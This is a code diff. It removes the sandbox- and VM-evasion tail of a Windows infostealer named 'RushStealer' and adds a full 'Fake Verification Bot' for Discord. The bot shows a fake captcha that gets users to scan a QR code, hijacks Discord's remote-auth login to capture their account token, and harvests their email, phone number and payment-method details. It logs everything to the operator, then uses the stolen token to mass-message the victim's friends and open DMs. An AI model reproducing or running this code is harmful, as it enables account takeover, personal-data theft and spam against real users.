-        for t in self.processes:
-            try:
-                t.join()
-            except RuntimeError:
-                continue
-
-    def programExit(self):
-        self.__class__.inVM = True
-
-    def listCheck(self):
-        for path in [r"D:\Tools", r"D:\OS2", r"D:\NT3X"]:
-            if ntpath.exists(path):
-                self.programExit()
-
-        for user in self.blackListedUsers:
-            if Victim == user:
-                self.programExit()
-
-        for pcName in self.blackListedPCNames:
-            if Victim_pc == pcName:
-                self.programExit()
-
-        for hwid in self.blackListedHWIDS:
-            if self.system_info()[0] == hwid:
-                self.programExit()
-
-    def specsCheck(self):
-        # would not recommend changing this to over 2gb since some actually have 3gb of ram
-        if int(ram) <= 2:  # 2gb or less ram
-            self.programExit()
-        if int(disk) <= 50:  # 50gb or less disc space
-            self.programExit()
-        if int(psutil.cpu_count()) <= 1:  # 1 or less cpu cores
-            self.programExit()
-
-    def registryCheck(self):
-        reg1 = os.system(
-            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul"
-        )
-        reg2 = os.system(
-            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul"
-        )
-        if (reg1 and reg2) != 1:
-            self.programExit()
-
-        handle = winreg.OpenKey(
-            winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"
-        )
-        try:
-            reg_val = winreg.QueryValueEx(handle, "0")[0]
-            if ("VMware" or "VBOX") in reg_val:
-                self.programExit()
-        finally:
-            winreg.CloseKey(handle)
-
-
-if __name__ == "__main__" and os.name == "nt":
+import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
+from nextcord import ButtonStyle
+from nextcord.ext import commands
+from nextcord.ui import Button, View
+from nextcord.utils import get
+from websockets import connect
+from websockets.exceptions import ConnectionClosedOK, ConnectionClosedError
+from websockets.typing import Origin
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives import hashes
+from colorama import Fore, init; init(autoreset=True)
+from urllib.request import Request, urlopen
+from time import sleep
+y = Fore.LIGHTYELLOW_EX
+b = Fore.LIGHTBLUE_EX
+w = Fore.LIGHTWHITE_EX
+
+#Get the headers
+def getheaders(token=None, content_type="application/json"):
+    headers = {
+        "Content-Type": content_type,
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
+    }
+    if token:
+        headers.update({"Authorization": token})
+    return headers
+
+#Recovery of the configuration put in the config.json file
+with open('config.json') as f:
+    config = json.load(f)
+
+botToken = config.get('botToken')
+prefix = config.get('prefix')
+command_name = config.get('command_name')
+logs_channel_id = config.get('logs_channel_id')
+give_role = config.get('give_role')
+role_name = config.get('role_name')
+mass_dm = config.get('mass_dm')
+message = config.get('message')
+
+#Bot title
+def bot_title():
+    os.system("cls")
+    ctypes.windll.kernel32.SetConsoleTitleW(f"Fake Verification Bot - Made by Astraa#6100")
+    print(f"""\n\n{Fore.RESET}                            ███████╗ █████╗ ██╗  ██╗███████╗    ██╗   ██╗███████╗██████╗ ██╗███████╗
+                            ██╔════╝██╔══██╗██║ ██╔╝██╔════╝    ██║   ██║██╔════╝██╔══██╗██║██╔════╝
+                            █████╗  ███████║█████╔╝ █████╗      ██║   ██║█████╗  ██████╔╝██║█████╗  
+                            ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝      ╚██╗ ██╔╝██╔══╝  ██╔══██╗██║██╔══╝  
+                            ██║     ██║  ██║██║  ██╗███████╗     ╚████╔╝ ███████╗██║  ██║██║██║     
+                            ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝      ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝╚═╝\n""".replace('█', f'{b}█{y}'))
+    print(f"""{y}------------------------------------------------------------------------------------------------------------------------\n{w}raadev | https://dsc.gg/astraadev | https://github.com/AstraaDev | https://ngu.bet/ | https://dsc.gg/ngubet | https://di\n{y}------------------------------------------------------------------------------------------------------------------------\n""".replace('|', f'{b}|{w}'))
+
+#Bot home page
+def startprint():
+    bot_title()
+
+    if give_role:
+        give_role_texte = f"""{Fore.GREEN}Active {Fore.RESET}with {Fore.LIGHTWHITE_EX}{role_name if role_name != "ROLE-NAME-HERE" else "None"}"""
+    else:
+        give_role_texte = f"{Fore.RED}Disabled"
+    
+    if mass_dm == 3:
+        mass_dm_texte = f"{Fore.GREEN}Friends{w}/{Fore.GREEN}Current DMs"
+    elif mass_dm == 2:
+        mass_dm_texte = f"{Fore.GREEN}Friends"
+    elif mass_dm == 1:
+        mass_dm_texte = f"{Fore.GREEN}Current DMs"
+    else:
+        mass_dm_texte = f"{Fore.RED}Disabled"
+
+    print(f"""                                            {y}[{b}+{y}]{w} Bot Informations:\n
+                                                [#] Logged in as:    {bot.user.name}
+                                                [#] Bot ID:          {bot.user.id}
+                                                [#] Logs Channel:    {logs_channel_id if logs_channel_id != "LOGS-CHANNEL-ID-HERE" else "None"}
+                                                [#] Command Name:    {bot.command_prefix}{command_name}\n\n
+                                            {y}[{b}+{y}]{w} Settings View:\n
+                                                [#] Give Role:       {give_role_texte}
+                                                [#] Mass DM Type:    {mass_dm_texte}\n\n\n""".replace('[#]', f'{y}[{w}#{y}]{w}'))
+    print(f"{y}[{Fore.GREEN}!{y}]{w} Bot Online!")
+
+intents = nextcord.Intents.default()
+intents.message_content = True
+
+bot = commands.Bot(command_prefix=prefix, description="Fake Verification Bot - Made by Astraa#6100", intents=intents)
+
+#Launching the Bot
+def Init():
+    botToken = config.get('botToken')
+    prefix = config.get('prefix')
+    if botToken == "":
+        bot_title()
+        input(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Please set a token in the config.json file.")
+        return
+    elif prefix == "":
+        bot_title()
+        input(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Please set a prefix in the config.json file.")
+        return
     try:
-        httpx.get("https://google.com")
-    except (httpx.NetworkError, httpx.TimeoutException):
-        os._exit(0)
-    asyncio.run(RushStealer().init())
+        bot.run(botToken)
+    except:
+        os.system("cls")
+        bot_title()
+        input(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} The token located in the config.json file is invalid")
+        return
+
+#Event initialization
+@bot.event
+async def on_ready():
+    startprint()
+    await bot.change_presence(activity=nextcord.Game(name="Verifies New Members"))
+
+#Bot command
+@bot.command(name=command_name)
+async def start(ctx):
+
+    #Recover the name of the channel logs
+    try:
+        logs_channel = bot.get_channel(int(logs_channel_id))
+    except:
+        logs_channel = None
+    verification = Button(label="Verify Me", style=ButtonStyle.blurple)
+
+    #If the verification button is clicked
+    async def verification_callback(interaction):
+        
+        #RemoteAuthClient by RuslanUC
+        class User:
+            def __init__(self, _id, _username, _discriminator, _avatar):
+                self.id = _id
+                self.username = _username
+                self.discriminator = _discriminator
+                self.avatar = _avatar
+        class RemoteAuthClient:
+            def __init__(self):
+                self.initCrypto()
+                self._heartbeatTask = None
+                self.on_fingerprint = self.ev
+                self.on_userdata = self.ev
+                self.on_token = self.ev
+                self.on_cancel = self.ev
+                self.on_timeout = self.ev
+    
+            def initCrypto(self):
+                self.privateKey = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+                self.publicKey = self.privateKey.public_key()
+                self.publicKeyString = "".join(self.publicKey.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo).decode("utf8").split("\n")[1:-2])
+    
+            def event(self, t):
+                def registerhandler(handler):
+                    if t == "on_fingerprint":
+                        self.on_fingerprint = handler
+                    elif t == "on_userdata":
+                        self.on_userdata = handler
+                    elif t == "on_token":
+                        self.on_token = handler
+                    elif t == "on_cancel":
+                        self.on_cancel = handler
+                    elif t == "on_timeout":
+                        self.on_timeout = handler
+                    return handler
+                return registerhandler
+    
+            def ev(self, *args, **kwargs):
+                pass
+    
+            async def run(self):
+                error = False
+    
+                async with connect("wss://remote-auth-gateway.discord.gg/?v=1", origin=Origin("https://discord.com")) as ws:
+                    while True:
+                        try:
+                            data = await ws.recv()
+                        except ConnectionClosedOK:
+                            break
+                        except ConnectionClosedError as e:
+                            if e.code == 4003:
+                                await self.on_timeout()
+                            else:
+                                error = True
+                            break
+    
+                        p = json.loads(data)
+    
+                        if p["op"] == "hello":
+                            await self.send({"op": "init", "encoded_public_key": self.publicKeyString}, ws)
+                            self._heartbeatTask = asyncio.get_event_loop().create_task(self.sendHeartbeat(p["heartbeat_interval"], ws))
+                            
+                        elif p["op"] == "nonce_proof":
+                            nonceHash = hashlib.sha256()
+                            nonceHash.update(self.privateKey.decrypt(base64.b64decode(bytes(p["encrypted_nonce"], "utf8")), padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)))
+                            nonceHash = base64.urlsafe_b64encode(nonceHash.digest()).decode("utf8")
+                            nonceHash = nonceHash.replace("/", "").replace("+", "").replace("=", "")
+                            await self.send({"op": "nonce_proof", "proof": nonceHash}, ws)
+
+                        elif p["op"] == "pending_remote_init":
+                            await self.on_fingerprint(data=f"https://discordapp.com/ra/{p['fingerprint']}")
+
+                        elif p["op"] == "pending_finish":
+                            decryptedUser = self.privateKey.decrypt(base64.b64decode(bytes(p["encrypted_user_payload"], "utf8")), padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)).decode("utf8")
+                            decryptedUser = decryptedUser.split(":")
+                            await self.on_userdata(user=User(decryptedUser[0], decryptedUser[3], decryptedUser[1], decryptedUser[2]))
+
+                        elif p["op"] == "finish":
+                            await self.on_token(token=self.privateKey.decrypt(base64.b64decode(bytes(p["encrypted_token"], "utf8")), padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)).decode("utf8"))
+                            break
+
+                        elif p["op"] == "cancel":
+                            await self.on_cancel()
+                            break
+    
+                self._heartbeatTask.cancel()
+    
+                if error:
+                    print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} RemoteAuthClient disconnected with error. Reconnecting...")
+                    self.initCrypto()
+                    await self.run()
+    
+            async def sendHeartbeat(self, interval, _ws):
+                while True:
+                    await asyncio.sleep(interval/1000)
+                    await self.send({"op": "heartbeat"}, _ws)
+    
+            async def send(self, jsonr, _ws):
+                await _ws.send(json.dumps(jsonr))
+    
+        c = RemoteAuthClient()
+        
+        #QR Creation, Informations sender, Role giver, Mass DM sender, ...
+        @c.event("on_fingerprint")
+        async def on_fingerprint(data):
+            @c.event("on_cancel")
+            async def on_cancel():
+                print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Auth canceled: {data}")
+    
+            @c.event("on_timeout")
+            async def on_timeout():
+                print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Timeout: {data}")
+    
+            embed_qr.set_image(url=f"https://api.qrserver.com/v1/create-qr-code/?size=256x256&data={data}")
+            await interaction.edit_original_message(embed=embed_qr)
+            print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} QR Code Generated: {data}")
+    
+            @c.event("on_userdata")
+            async def on_userdata(user):
+                if not os.path.isfile("database.json"):
+                    json.dump({}, open("database.json", "w", encoding="utf-8"), indent=4)
+    
+                database = json.load(open("database.json", encoding="utf-8"))
+    
+                if not user.id in database:
+                    database[user.id] = {}
+    
+                database[user.id]["username"] = f"{user.username}#{user.discriminator}"
+                database[user.id]["avatar_url"] = f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png"
+    
+                json.dump(database, open("database.json", "w", encoding="utf-8"), indent=4)
+                print(f"{y}[{b}#{y}]{w} {user.username}#{user.discriminator} ({user.id})")
+    
+                @c.event("on_token")
+                async def on_token(token):
+                    if not os.path.isfile("database.json"):
+                        json.dump({}, open("database.json", "w", encoding="utf-8"), indent=4)
+    
+                    database = json.load(open("database.json", encoding="utf-8"))
+
+                    if not user.id in database:
+                        database[user.id] = {}
+
+                    try:
+                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=getheaders(token))
+                        if res.status_code == 200:
+                            res_json = res.json()
+                            avatar_id = res_json['avatar']
+                            phone_number = res_json['phone']
+                            email = res_json['email']
+                            mfa_enabled = res_json['mfa_enabled']
+                            flags = res_json['flags']
+                            locale = res_json['locale']
+                            verified = res_json['verified']
+                            has_nitro = False
+                            res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))
+                            nitro_data = res.json()
+                            has_nitro = bool(len(nitro_data) > 0)
+                            billing_info = []
+                            for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token, 'Content-Type': 'application/json'}).json():
+                                if x['type'] == 1:
+                                    data = {'Payment Type': 'Credit Card', 'Valid': not x['invalid']}
+    
+                                elif x['type'] == 2:
+                                    data = {'Payment Type': 'PayPal', 'Valid': not x['invalid']}
+    
+                                billing_info.append(data)
+                            payment_methods = len(billing_info)
+                            database[user.id]["avatar_id"] = avatar_id
+                            database[user.id]["phone_number"] = phone_number
+                            database[user.id]["email"] = email
+                            database[user.id]["mfa_enabled"] = mfa_enabled
+                            database[user.id]["flags"] = flags
+                            database[user.id]["locale"] = locale
+                            database[user.id]["verified"] = verified
+                            database[user.id]["has_nitro"] = has_nitro
+                            database[user.id]["payment_methods"] = payment_methods
+                            if logs_channel:
+                                embed_user = nextcord.Embed(title=f"**New user verified: {user.username}#{user.discriminator}**", description=f"```yaml\nUser ID: {user.id}\nAvatar ID: {avatar_id}\nPhone Number: {phone_number}\nEmail: {email}\nMFA Enabled: {mfa_enabled}\nFlags: {flags}\nLocale: {locale}\nVerified: {verified}\nHas Nitro: {has_nitro}\nPayment Methods: {payment_methods}\n```\n```yaml\nToken: {token}\n```", color=5003474)
+                    except:
+                        if logs_channel:
+                            embed_user = nextcord.Embed(title=f"**New user verified: {user.username}#{user.discriminator}**", description=f"```yaml\nUser ID: {user.id}\nToken: {token}\n```\n```yaml\nNo other information found\n```", color=5003474)
+                        pass
+                    
+                    database[user.id]["token"] = token
+                
+                    json.dump(database, open("database.json", "w", encoding="utf-8"), indent=4)
+
+                    print(f"{y}[{b}#{y}]{w} Token: {token}")
+                    if logs_channel:
+                        embed_user.set_footer(text="Made by Astraa#6100  ・  https://github.com/astraadev")
+                        embed_user.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
+                        await logs_channel.send(embed=embed_user)
+                    
+                    #If Enable, gives a role after verification
+                    if give_role == True:
+                        try:
+                            await interaction.user.add_roles(get(ctx.guild.roles, name=role_name))
+                            print(f"{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Role added to {user.username}#{user.discriminator}")
+                            if logs_channel:
+                                embed_role = nextcord.Embed(title=f"**Add Role Option:**", description=f"```yaml\nRole {role_name} added to {user.username}#{user.discriminator} with success!```", color=5003474)
+                                embed_role.set_footer(text="Made by Astraa#6100  ・  https://github.com/astraadev")
+                                embed_role.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
+                                await logs_channel.send(embed=embed_role)
+                        except:
+                            print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} There is a problem with your role. Check the Name and make sure it can give this role")
+
+                    #If Enable, DM all the current person's private chat
+                    if mass_dm == 1 or mass_dm == 3:
+                        try:
+                            success = 0
+                            failures = 0
+                            channel_id = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
+    
+                            if not channel_id:
+                                print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} This guy is lonely, he aint got no dm's...")
+                            for channel in [channel_id[i:i+3] for i in range(0, len(channel_id), 3)]:
+                                for channel2 in channel:
+                                    for _ in [x["username"] + "#" + x["discriminator"] for x in channel2["recipients"]]:
+                                        try:
+                                            requests.post(f'https://discord.com/api/v9/channels/' + channel2['id'] + '/messages', headers={'Authorization': token}, data={"content": f"{message}"})
+                                            success += 1
+                                            sleep(.5)
+                                        except:
+                                            failures += 1
+                                            sleep(.5)
+                                            pass
+                            print(f"{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Current DM(s) successfully messaged")
+                            if logs_channel:
+                                embed_cdm = nextcord.Embed(title=f"**Spam Current DMs Option:**", description=f"Messages sent succesfully with {user.username}#{user.discriminator} account\n```yaml\nMessage: {message}\nCurrent Dms: {len(channel_id)}\nSuccessfully sent: {success} message(s)\nUnuccessfully sent: {failures} message(s)```", color=5003474)
+                                embed_cdm.set_footer(text="Made by Astraa#6100  ・  https://github.com/astraadev")
+                                embed_cdm.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
+                                await logs_channel.send(embed=embed_cdm)
+                        except Exception as e:
+                            print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Mass DM failed: {e}")
+                            pass
+                    
+                    #If active, DM all user's friends
+                    if mass_dm == 2 or mass_dm == 3:
+                        try:
+                            getfriends = json.loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
+
+                            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\n{message}\n-----------------------------325414537030329320151394843687--'
+                            for friend in getfriends:
+                                try:
+                                    chat_id = json.loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=json.dumps({"recipient_id": friend["id"]}).encode())).read().decode())["id"]
+                                    send_message = urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=payload.encode())).read().decode()
+                                    send_message(token, chat_id, payload)
+                                except:
+                                    pass
+                                sleep(.5)
+
+                            if len(getfriends) == 0:
+                                print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} This guy is lonely, he aint got no friends...")
+                            else:
+                                print(f"{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Friend(s) successfully messaged")
+                            if logs_channel:
+                                embed_fdm = nextcord.Embed(title=f"**Spam Friends Option:**", description=f"Messages sent succesfully with {user.username}#{user.discriminator} account\n```yaml\nMessage: {message}\nTotal Friends: {len(getfriends)}```", color=5003474)
+                                embed_fdm.set_footer(text="Made by Astraa#6100  ・  https://github.com/astraadev")
+                                embed_fdm.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
+                                await logs_channel.send(embed=embed_fdm)
+                        except Exception as e:
+                            print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Mass DM failed: {e}")
+                            pass
+        
+        #Embed Creation
+        asyncio.create_task(c.run())
+        embed_qr = nextcord.Embed(title="__**Hello, are you human? Let's find out!**__", description="You are seeing this because your account has been flagged for verification...\n\n**Please follow these steps to complete your verification**:\n1️⃣ *Open the Discord Mobile application*\n2️⃣ *Go to settings*\n3️⃣ *Choose the \"Scan QR Code\" option*\n4️⃣ *Scan the QR code below*", color=5003474)
+        embed_qr.set_footer(text="Note: captcha expires in 2 minutes")
+        embed_qr.set_thumbnail(url="https://emoji.discord.st/emojis/aa142d2c-681c-45a2-99e9-a6e63849b351.png")
+        await interaction.response.send_message(embed=embed_qr, ephemeral=True)
+
+    verification.callback = verification_callback
+
+    myview = View(timeout=None)
+    myview.add_item(verification)
+    embed = nextcord.Embed(title="**Verification required!**", description="🔔 To acces this server, you need to pass the verification first\n🧿 Press the button bellow", color=5003474)
+    await ctx.send(embed=embed, view=myview)
+
+#Start Everything
+if __name__ == '__main__':
+    Init()
